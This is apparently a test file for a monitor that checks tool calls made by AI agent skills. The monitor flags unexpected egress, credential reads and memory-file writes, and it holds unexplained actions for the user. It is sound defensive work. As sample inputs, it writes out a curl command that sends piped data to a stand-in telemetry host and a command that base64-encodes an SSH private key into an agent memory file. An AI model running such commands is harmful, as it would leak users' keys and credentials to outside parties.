import { test } from "node:test";
import assert from "node:assert/strict";
import { deviations, hostsIn, parseToolEvent, pathsIn } from "../src/runtime.js";
import type { ResolveResponse } from "../src/state.js";

const verdict = (over: Partial<ResolveResponse["trace_summary"] & object> = {}, network: string[] = []): ResolveResponse => ({
  status: "scored", skill: { name: "deploy-helper", registry: "clawhub", registry_label: "ClawHub", install_count: 1, page: "/skills/clawhub/deploy-helper/2.3.1", kind: "skill" },
  publisher: { handle: "x", verified: false, age_days: 10 }, version: { semver: "2.3.1", artifact_hash: "a".repeat(64), declared_permissions: { network, filesystem: ["./"], memory: false } },
  verdict: { id: "v", score: 90, label: "verified", duration_ms: 1, scenarios_run: 3 },
  trace_summary: { egress_hosts: [{ host: "api.vercel.com", declared: true }], files_read: ["./src/index.ts"], files_written: ["./dist/out.js"], memory_writes: [], tool_shadowing: [], ...over }, findings: [], last_safe_version: null,
});

test("hosts and paths are extracted from shell commands", () => {
  assert.deepEqual(hostsIn("curl -s https://telemetry-cdn.xyz/v1/collect -d @- && ssh deploy@build.example.com uptime"), ["telemetry-cdn.xyz", "build.example.com"]);
  const p = pathsIn("cat ~/.ssh/id_ed25519 | base64 >> ~/MEMORY.md");
  assert.ok(p.read.includes("~/.ssh/id_ed25519")); assert.ok(p.written.includes("~/MEMORY.md"));
});

test("unexpected egress, credential read and memory write are deviations; expected activity is not", () => {
  const r = verdict();
  const bash = parseToolEvent("Bash", { command: "curl https://telemetry-cdn.xyz/x; curl https://api.vercel.com/deploy" });
  const ds = deviations("deploy-helper", r, bash, "Bash", "s1");
  assert.deepEqual(ds.map((d) => d.kind), ["egress_unexpected"]);
  assert.match(ds[0].detail, /telemetry-cdn\.xyz/);
  const read = parseToolEvent("Read", { file_path: `${process.env.HOME}/.aws/credentials` });
  assert.deepEqual(deviations("deploy-helper", r, read, "Read", "s1").map((d) => d.kind), ["credential_read"]);
  const write = parseToolEvent("Write", { file_path: `${process.env.HOME}/work/acme/CLAUDE.md`, content: "x" });
  assert.deepEqual(deviations("deploy-helper", r, write, "Write", "s1").map((d) => d.kind), ["memory_write"]);
  const ok = parseToolEvent("Read", { file_path: `${process.cwd()}/src/index.ts` });
  assert.deepEqual(deviations("deploy-helper", r, ok, "Read", "s1"), []);
});

test("a memory write the sandbox also saw is not a deviation; declared hosts are fine", () => {
  const r = verdict({ memory_writes: [{ file: "MEMORY.md" }] }, ["hooks.example.com"]);
  assert.deepEqual(deviations("deploy-helper", r, parseToolEvent("Write", { file_path: `${process.env.HOME}/p/MEMORY.md` }), "Write", null), []);
  assert.deepEqual(deviations("deploy-helper", r, parseToolEvent("WebFetch", { url: "https://hooks.example.com/x" }), "WebFetch", null), []);
});

test("mcp tool names attribute to the server; Skill invocations set the active skill", () => {
  assert.equal(parseToolEvent("Skill", { skill: "deploy-helper" }).skillInvoked, "deploy-helper");
  assert.equal(parseToolEvent("mcp__github-mcp__create_pr", { title: "x" }).kind, "mcp");
});

test("session intent: a sensitive action the user's own actions explain becomes a scoped allow; one with no context is held", async () => {
  const { mkdtempSync } = await import("node:fs"); const { tmpdir } = await import("node:os"); const { join } = await import("node:path");
  process.env.VET_SKILLS_HOME = mkdtempSync(join(tmpdir(), "vs-intent-"));
  process.env.VET_SKILLS_TELEMETRY = "0";
  const { explainedBy, mentionsIn, observe, readAllows, recordPrompt } = await import(`../src/runtime.ts?intent=${Date.now()}`);
  const m = mentionsIn("please check my ~/.aws/credentials and ping api.internal.example.com, then look at .ssh/config");
  assert.ok(m.paths.includes("~/.aws/credentials") && m.paths.includes("~/.ssh/config"));
  assert.ok(m.hosts.includes("api.internal.example.com"));
  const d = (kind: "credential_read" | "egress_unexpected", detail: string) => ({ kind, skill: "s", semver: null, detail, tool: "Bash", at: new Date().toISOString(), session: "s1", page: null });
  const intent = { hosts: { "api.internal.example.com": Date.now() }, paths: { "~/.aws": Date.now() - 60_000 }, prompts: 1 };
  assert.match(explainedBy(intent, d("credential_read", "read ~/.aws/credentials; the sandbox never saw a credential path read")) ?? "", /worked in ~\/\.aws yourself/);
  assert.match(explainedBy(intent, d("egress_unexpected", "contacted api.internal.example.com; the sandbox saw nothing")) ?? "", /named api\.internal\.example\.com yourself/);
  assert.equal(explainedBy(intent, d("egress_unexpected", "contacted telemetry-cdn.xyz; the sandbox saw nothing")), null);
  assert.equal(explainedBy({ hosts: {}, paths: { "~/.aws": Date.now() - 40 * 60_000 }, prompts: 0 }, d("credential_read", "read ~/.aws/credentials; x")), null, "older than the 30-minute window");
  // End to end through the hook: the user names a host in a prompt, then an MCP server's tool contacts it.
  const sid = `sess-${Date.now().toString(36)}`;
  recordPrompt(JSON.stringify({ session_id: sid, prompt: "deploy to build.example.com" }));
  const ev = { session_id: sid, tool_name: "Bash", tool_input: { command: "curl https://build.example.com/x" } };
  // A Bash call with no skill driving it is the user's own work: recorded, never a deviation.
  const own = await observe(JSON.stringify(ev)); assert.equal(own.code, 0); assert.equal(own.lines.length, 0);
  // A skill drives the next one: the host is explained, so it is allowed with a notice instead of held.
  await observe(JSON.stringify({ session_id: sid, tool_name: "Skill", tool_input: { skill: "deploy-helper" } }));
  const r = await observe(JSON.stringify(ev));
  assert.equal(r.code, 0, r.lines.join("\n"));
  assert.match(r.lines[0] ?? "", /allowed because you asked for it/);
  assert.ok(readAllows().some((a) => a.session === sid && a.resource === "build.example.com"));
  // Unexplained host from the same skill: held, and the agent told to ask.
  const held = await observe(JSON.stringify({ session_id: sid, tool_name: "Bash", tool_input: { command: "curl https://telemetry-cdn.xyz/collect" } }));
  assert.equal(held.code, 2); assert.match(held.lines[0], /ask the user before continuing/);
});
